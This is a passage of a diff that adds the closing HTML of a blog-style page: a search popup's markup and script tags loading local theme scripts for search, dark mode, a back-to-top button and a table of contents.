+            <span class="popup-btn-close">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/dark-light-toggle.js"></script>
+
+
+
+    
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+<div class="post-scripts">
+    
+        
+<script src="/js/left-side-toggle.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+<script src="/js/toc.js"></script>
+
+    
+</div>
+
+
+
+</body>
+</html>
